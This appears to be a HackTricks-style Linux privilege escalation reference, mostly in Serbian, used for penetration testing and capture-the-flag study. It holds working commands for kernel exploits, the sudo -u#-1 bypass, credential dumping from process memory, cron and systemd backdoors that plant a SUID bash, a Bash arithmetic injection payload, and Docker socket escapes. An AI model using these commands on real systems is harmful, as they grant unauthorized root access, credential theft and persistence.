# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacije o sistemu

### Informacije o OS-u

Počnimo sa prikupljanjem informacija o operativnom sistemu koji je pokrenut
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ako **have write permissions on any folder inside the `PATH`** variable, možda ćete moći da hijack neke libraries ili binaries:
```bash
echo $PATH
```
### Info o env

Postoje li zanimljive informacije, lozinke ili API ključevi u varijablama okruženja?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Proverite kernel version i da li postoji exploit koji se može iskoristiti za escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Možete naći dobru listu ranjivih kernel verzija i neke već **compiled exploits** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Drugi sajtovi na kojima možete naći neke **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Da biste izvukli sve ranjive kernel verzije sa te stranice možete uraditi:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Alati koji mogu pomoći pri pretraživanju kernel exploits su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, samo proverava exploits za kernel 2.x)

Uvek **pretraži verziju kernela na Google-u**, možda je tvoja kernel verzija navedena u nekom kernel exploit-u i tada ćeš biti siguran da je taj exploit validan.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo verzija

Na osnovu ranjivih verzija sudo koje se pojavljuju u:
```bash
searchsploit sudo
```
Možete proveriti da li je verzija sudo ranjiva koristeći ovaj grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: verifikacija potpisa nije uspela

Pogledaj **smasher2 box of HTB** za **primer** kako se ovaj vuln može iskoristiti
```bash
dmesg 2>/dev/null | grep "signature"
```
### Dodatna enumeracija sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Nabrojte moguće odbrane

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ako ste unutar docker container, možete pokušati da iz njega pobegnete:


{{#ref}}
docker-security/
{{#endref}}

## Diskovi

Proverite **šta je montirano i odmontirano**, gde i zašto. Ako je nešto odmontirano, možete pokušati da ga montirate i proverite ima li privatnih informacija.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Korisni software

Nabroj korisne binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Takođe proverite da li je **instaliran neki compiler**. Ovo je korisno ako treba da koristite neki kernel exploit, jer se preporučuje da ga kompajlirate na mašini na kojoj ćete ga koristiti (ili na nekoj sličnoj).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Instaliran ranjiv softver

Proverite **verziju instaliranih paketa i servisa**. Možda postoji neka stara Nagios verzija (na primer) koja bi mogla biti iskorišćena za escalating privileges…\
Preporučuje se ručno proveriti verziju sumnjivijeg instaliranog softvera.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ako imate SSH pristup mašini, možete takođe koristiti **openVAS** da proverite zastareli i ranjivi softver instaliran na toj mašini.

> [!NOTE] > _Imajte na umu da će ove komande prikazati mnogo informacija koje će većinom biti beskorisne, zato se preporučuje korišćenje aplikacija kao što je OpenVAS ili sličnih koje će proveriti da li je neka instalirana verzija softvera ranjiva na poznate exploits_

## Procesi

Pogledajte **koji se procesi** izvršavaju i proverite da li neki proces ima **više privilegija nego što bi trebalo** (možda tomcat koji se izvršava kao root?)
```bash
ps aux
ps -ef
top -n 1
```
Uvek proverite da li su pokrenuti [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** ih detektuje proverom `--inspect` parametra u komandnoj liniji procesa.\
Takođe **proverite svoje privilegije nad binarkama procesa**, možda možete prepisati neku.

### Process monitoring

Možete koristiti alate kao što je [**pspy**](https://github.com/DominicBreuker/pspy) za nadgledanje procesa. Ovo može biti veoma korisno da identifikujete ranjive procese koji se često izvršavaju ili kada su ispunjeni određeni uslovi.

### Process memory

Neki servisi na serveru čuvaju **podatke za prijavu u čistom tekstu u memoriji**.\
Obično su vam potrebne **root privilegije** da biste čitali memoriju procesa koji pripadaju drugim korisnicima, stoga je ovo obično korisnije kada ste već root i želite da otkrijete dodatne podatke za prijavu.\
Međutim, zapamtite da **kao običan korisnik možete čitati memoriju procesa koje posedujete**.

> [!WARNING]
> Imajte na umu da većina mašina danas **po defaultu ne dozvoljava ptrace**, što znači da ne možete dumpovati druge procese koji pripadaju vašem neprivilegovanom korisniku.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

Ako imate pristup memoriji FTP servisa (na primer) možete dohvatiti Heap i pretražiti unutar njega podatke za prijavu.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Za dati ID procesa, **maps pokazuje kako je memorija mapirana u okviru virtuelnog adresnog prostora tog procesa**; takođe prikazuje **dozvole svake mapirane regije**. Pseudosistemski fajl **mem** otkriva samu memoriju procesa. Iz **maps** fajla znamo koje su **memorijske regije čitljive** i njihove offset-e. Koristimo te informacije da se pozicioniramo u **mem** fajlu i dump-ujemo sve čitljive regije u fajl.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` omogućava pristup sistemskoj **fizičkoj** memoriji, a ne virtuelnoj memoriji. Kernelov virtuelni adresni prostor može se pristupiti koristeći /dev/kmem.\
Obično je `/dev/mem` čitljiv samo od strane **root** i grupe **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump za Linux

ProcDump je Linux verzija klasičnog ProcDump alata iz Sysinternals paketa alata za Windows. Nabavite ga na [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Alati

Za dump memorije procesa možete koristiti:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Možete ručno ukloniti root zahteve i napraviti dump procesa koji vam pripada
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root je potreban)

### Kredencijali iz memorije procesa

#### Ručni primer

Ako otkrijete da je proces authenticator pokrenut:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Možete dump the process (pogledajte prethodne sekcije da biste pronašli različite načine za dump the memory of a process) i pretražiti credentials unutar memory-ja:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Alat [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **steal clear text credentials from memory** i iz nekih **well known files**. Potrebne su root privilegije da bi ispravno radio.

| Značajka                                           | Naziv procesa         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zakazani/Cron jobs

Proveri da li je neki zakazani job ranjiv. Možda možeš iskoristiti skriptu koju izvršava root (wildcard vuln? možeš li izmeniti fajlove koje root koristi? koristiti symlinks? kreirati specifične fajlove u direktorijumu koje root koristi?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

For example, inside _/etc/crontab_ you can find the PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Napomena: korisnik "user" ima privilegije pisanja nad /home/user_)

Ako u ovom crontab-u root user pokuša da izvrši neku komandu ili skript bez postavljenog PATH-a. Na primer: _\* \* \* \* root overwrite.sh_\
Tada možete dobiti root shell koristeći:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron koji koristi skriptu sa wildcard-om (Wildcard Injection)

Ako se skripta izvršava kao root i sadrži “**\***” u nekoj komandi, možete to iskoristiti da učinite neočekivane stvari (poput privesc). Primer:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ako je wildcard prethodi putanji kao** _**/some/path/\***_ **, nije ranjiv (čak ni** _**./\***_ **nije).**

Pročitajte sledeću stranicu za više wildcard exploitation trikova:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash izvršava parameter expansion i command substitution pre arithmetic evaluation u ((...)), $((...)) i let. Ako root cron/parser čita nepouzdana polja iz loga i ubacuje ih u arithmetic context, napadač može injektovati command substitution $(...) koji se izvršava kao root kada cron pokrene.

- Zašto radi: U Bash-u, expansions se dešavaju redom: parameter/variable expansion, command substitution, arithmetic expansion, pa zatim word splitting i pathname expansion. Dakle vrednost kao `$(/bin/bash -c 'id > /tmp/pwn')0` se prvo zameni (izvršavajući komandu), a zatim preostali numerički `0` se koristi za arithmetic tako da se skripta nastavlja bez grešaka.

- Tipičan ranjiv obrazac:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Naterajte da tekst koji kontroliše attacker bude upisan u parsirani log tako da polje koje izgleda kao broj sadrži command substitution i završava cifrom. Osigurajte da vaša komanda ne piše na stdout (ili je preusmerite) tako da arithmetic ostane validan.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Ako **možete izmeniti cron skriptu** koju izvršava root, možete veoma lako dobiti shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ako script koji izvršava root koristi **direktorijum kojem imate potpuni pristup**, možda bi bilo korisno obrisati taj folder i **napraviti symlink folder koji pokazuje na drugi** koji poslužuje script pod vašom kontrolom
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Česti cron jobs

Možete nadgledati procese kako biste pronašli one koji se izvršavaju svakih 1, 2 ili 5 minuta. Možda to možete iskoristiti za eskalaciju privilegija.

Na primer, da biste **nadgledali svakih 0.1s tokom 1 minuta**, **sortirali po najmanje izvršenim komandama** i obrisali komande koje su se najviše izvršavale, možete uraditi:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Možete takođe koristiti** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ovo će nadgledati i ispisati svaki proces koji se pokrene).

### Nevidljivi cron jobs

Moguće je napraviti cronjob tako što ćete **staviti carriage return posle komentara** (bez newline karaktera); cron job će i dalje raditi. Primer (obratite pažnju na carriage return karakter):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisi

### _.service_ fajlovi koji su upisivi

Proverite da li možete pisati bilo koji `.service` fajl, ako možete, možete ga **izmeniti** tako da **pokrene** vaš **backdoor kada** se servis **pokrene**, **restartuje** ili **zaustavi** (možda ćete morati da sačekate dok se mašina restartuje).\
Na primer kreirajte vaš backdoor unutar .service fajla sa **`ExecStart=/tmp/script.sh`**

### Izvršne datoteke servisa koje su upisive

Imajte na umu da ako imate **privilegije za pisanje nad binarnim fajlovima koje izvršavaju servisi**, možete ih promeniti u backdoors tako da kada se servisi ponovo izvrše backdoors budu izvršeni.

### systemd PATH - Relative Paths

Možete videti PATH koji koristi **systemd** pomoću:
```bash
systemctl show-environment
```
Ako primetite da možete **write** u bilo kojoj od fascikli u putanji, možda ćete moći **escalate privileges**. Treba da tražite **relative paths being used on service configurations** u fajlovima kao što su:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Zatim kreirajte **izvršni fajl** sa **istim imenom kao binarni fajl koji se poziva relativnom putanjom** unutar systemd PATH direktorijuma u koji možete pisati, i kada se od servisa zahteva izvršenje ranjive akcije (**Start**, **Stop**, **Reload**), vaš **backdoor će biti izvršen** (neprivilegovani korisnici obično ne mogu da startuju/zaustave servise, ali proverite da li možete da koristite `sudo -l`).

**Saznajte više o servisima pomoću `man systemd.service`.**

## **Timers**

**Timers** su systemd unit fajlovi čije ime se završava sa `**.timer**` koji kontrolišu `**.service**` fajlove ili događaje. **Timers** se mogu koristiti kao alternativa cron-u jer imaju ugrađenu podršku za događaje po kalendarskom vremenu i monotone vremenske događaje i mogu se pokretati asinhrono.

Možete izlistati sve timere pomoću:
```bash
systemctl list-timers --all
```
### Timeri koji se mogu menjati

Ako možete izmeniti timer, možete ga naterati da izvrši neku jedinicu systemd.unit (npr. `.service` ili `.target`)
```bash
Unit=backdoor.service
```
U dokumentaciji možete pročitati šta je Unit:

> Jedinica koja se aktivira kada ovaj timer istekne. Argument je naziv jedinice, čiji sufiks nije ".timer". Ako nije navedeno, ova vrednost podrazumevano pokazuje na service koji ima isto ime kao timer jedinica, osim sufiksa. (Vidi iznad.) Preporučuje se da naziv jedinice koja se aktivira i naziv timer jedinice budu identični, osim sufiksa.

Dakle, da zloupotrebite ovu dozvolu, morali biste:

- Pronaći neku systemd jedinicu (kao `.service`) koja izvršava binarni fajl na koji imate pravo pisanja
- Pronaći neku systemd jedinicu koja izvršava relativnu putanju i nad systemd PATH imate privilegije za pisanje (da imitujete taj izvršni fajl)

Saznajte više o timerima pomoću `man systemd.timer`.

### **Omogućavanje timera**

Da biste omogućili timer potrebne su root privilegije i da izvršite:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Napomena: **timer** se **aktivira** kreiranjem symlinka ka njemu na `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Soketi

Unix Domain Sockets (UDS) omogućavaju **komunikaciju između procesa** na istom ili različitim mašinama u okviru client-server modela. Koriste standardne Unix descriptor fajlove za međuračunarsku komunikaciju i konfigurišu se kroz `.socket` fajlove.

Sockets se mogu konfigurisati pomoću `.socket` fajlova.

**Saznajte više o socket-ima pomoću `man systemd.socket`.** Unutar ovog fajla može se konfigurisati nekoliko interesantnih parametara:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ove opcije su različite, ali u suštini služe da **naznače na čemu će socket slušati** (putanja AF_UNIX socket fajla, IPv4/6 i/ili broj porta za slušanje, itd.)
- `Accept`: Prihvata boolean argument. Ako je **true**, za svaku dolaznu konekciju se **pokreće instanca servisa** i samo konekcioni socket se prosljeđuje njoj. Ako je **false**, svi listening socket-i sami se **prosljeđuju pokrenutoj service jedinici**, i samo jedna service jedinica se pokreće za sve konekcije. Ova vrednost se ignoriše za datagram sokete i FIFO-e gde jedinstvena service jedinica bezuslovno obrađuje sav dolazni saobraćaj. **Podrazumevano je false**. Iz razloga performansi, preporučuje se pisanje novih daemona tako da budu pogodni za `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Prihvataju jednu ili više komandnih linija, koje se izvršavaju **pre** odnosno **posle** kreiranja i bindovanja listening **socket**-a/ FIFO-a. Prvi token komandne linije mora biti apsolutno ime fajla, nakon čega slede argumenti za proces.
- `ExecStopPre`, `ExecStopPost`: Dodatne **komande** koje se izvršavaju **pre** odnosno **posle** zatvaranja i uklanjanja listening **socket**-a/ FIFO-a.
- `Service`: Specificira ime **service** jedinice **koju treba aktivirati** na **dolazni saobraćaj**. Ova opcija je dozvoljena samo za sokete sa Accept=no. Podrazumevano je servis koji nosi isto ime kao socket (sa zamenjenim sufiksom). U većini slučajeva nije potrebno koristiti ovu opciju.

### Writable .socket files

Ako nađete **writable** `.socket` fajl možete **dodati** na početak `[Socket]` sekcije nešto poput: `ExecStartPre=/home/kali/sys/backdoor` i backdoor će biti izvršen pre nego što se socket kreira. Stoga, **verovatno ćete morati da sačekate restart mašine.**\
_Napomena: sistem mora koristiti tu konfiguraciju socket fajla, inače backdoor neće biti izvršen_

### Writable sockets

Ako **identifikujete bilo koji writable socket** (_sada govorimo o Unix soketima, a ne o konfig `.socket` fajlovima_), onda **možete komunicirati** sa tim socket-om i možda iskoristiti neku ranjivost.

### Enumerisanje Unix soketa
```bash
netstat -a -p --unix
```
### Sirova konekcija
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Primer eksploatacije:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Imajte na umu da može postojati nekoliko **sockets listening for HTTP** requests (_ne mislim na .socket files već na fajlove koji funkcionišu kao unix sockets_). Možete to proveriti pomoću:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ako soket **odgovara na HTTP** zahtev, onda možete **komunicirati** s njim i možda **iskoristiti neku ranjivost**.

### Docker socket dostupan za pisanje

Docker socket, često se nalazi na `/var/run/docker.sock`, je kritičan fajl koji treba zabezbediti. Po defaultu, upisiv je od strane korisnika `root` i članova grupe `docker`. Imati pravo pisanja na ovaj socket može dovesti do eskalacije privilegija. Evo pregleda kako se to može uraditi i alternativnih metoda ako Docker CLI nije dostupan.

#### **Eskalacija privilegija pomoću Docker CLI**

Ako imate pravo pisanja na Docker socket, možete eskalirati privilegije koristeći sledeće komande:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ove komande vam omogućavaju pokretanje kontejnera sa root pristupom fajl sistemu hosta.

#### **Direktno korišćenje Docker API**

U slučajevima kada Docker CLI nije dostupan, Docker socket se i dalje može manipulisati koristeći Docker API i `curl` komande.

1.  **List Docker Images:** Dohvatite listu dostupnih images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Pošaljite zahtev za kreiranje kontejnera koji montira root direktorijum host sistema.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Pokrenite novo kreirani kontejner:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Upotrebite `socat` da uspostavite konekciju sa kontejnerom, omogućavajući izvršavanje komandi unutar njega.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nakon uspostavljanja `socat` konekcije, možete direktno izvršavati komande u kontejneru sa root pristupom fajl sistemu hosta.

### Ostalo

Imajte u vidu da ako imate write permissions nad Docker socket-om zato što ste **inside the group `docker`** imate [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Ako [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Pogledajte **more ways to break out from docker or abuse it to escalate privileges** u:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Ako ustanovite da možete da koristite **`ctr`** komandu, pročitajte sledeću stranicu jer **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Ako ustanovite da možete da koristite **`runc`** komandu, pročitajte sledeću stranicu jer **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus je sofisticiran sistem za inter-Process Communication (IPC) koji omogućava aplikacijama da efikasno međusobno komuniciraju i razmenjuju podatke. Dizajniran za moderne Linux sisteme, pruža robustan okvir za različite oblike aplikacijske komunikacije.

Sistem je svestran, podržava osnovni IPC koji poboljšava razmenu podataka između procesa, podsećajući na unapređene UNIX domain sockets. Pored toga, pomaže u emitovanju događaja ili signala, olakšavajući besprekornu integraciju među komponentama sistema. Na primer, signal od Bluetooth daemona o dolaznom pozivu može naterati muzički plejer da utiša zvuk, poboljšavajući korisničko iskustvo. D-Bus takođe podržava sistem udaljenih objekata, pojednostavljujući zahteve servisa i pozive metoda između aplikacija, pojednostavljujući procese koji su tradicionalno bili složeni.

D-Bus radi na allow/deny modelu, upravljajući dozvolama za poruke (pozivi metoda, emitovanje signala itd.) zasnovano na kumulativnom efektu podudaranja pravila politike. Ove politike specificiraju interakcije sa bus-om, što potencijalno može dovesti do eskalacije privilegija kroz eksploataciju ovih dozvola.

Primer takve politike u `/etc/dbus-1/system.d/wpa_supplicant.conf` je dat, koji detaljno opisuje dozvole za root korisnika da poseduje, šalje ka i prima poruke od `fi.w1.wpa_supplicant1`.

Politike bez specificiranog korisnika ili grupe važe univerzalno, dok "default" context politike važe za sve koji nisu obuhvaćeni nekim drugim specifičnim pravilima.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Saznajte kako da izlistate i iskoristite D-Bus komunikaciju ovde:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mreža**

Uvek je korisno izlistati mrežu i utvrditi poziciju mašine.

### Generička enumeracija
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otvoreni portovi

Uvek proverite mrežne servise koji rade na mašini sa kojom ranije niste mogli da stupite u interakciju, pre nego što joj pristupite:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Proverite da li možete sniff traffic. Ako možete, mogli biste dobiti neke credentials.
```
timeout 1 tcpdump
```
## Korisnici

### Generička enumeracija

Proverite **ko** ste, koje **privilegije** imate, koji **korisnici** postoje u sistemima, koji mogu da se **login** i koji imaju **root privilegije**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Neke verzije Linuxa bile su pogođene ranjivošću koja omogućava korisnicima sa **UID > INT_MAX** da eskaliraju privilegije. Više informacija: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
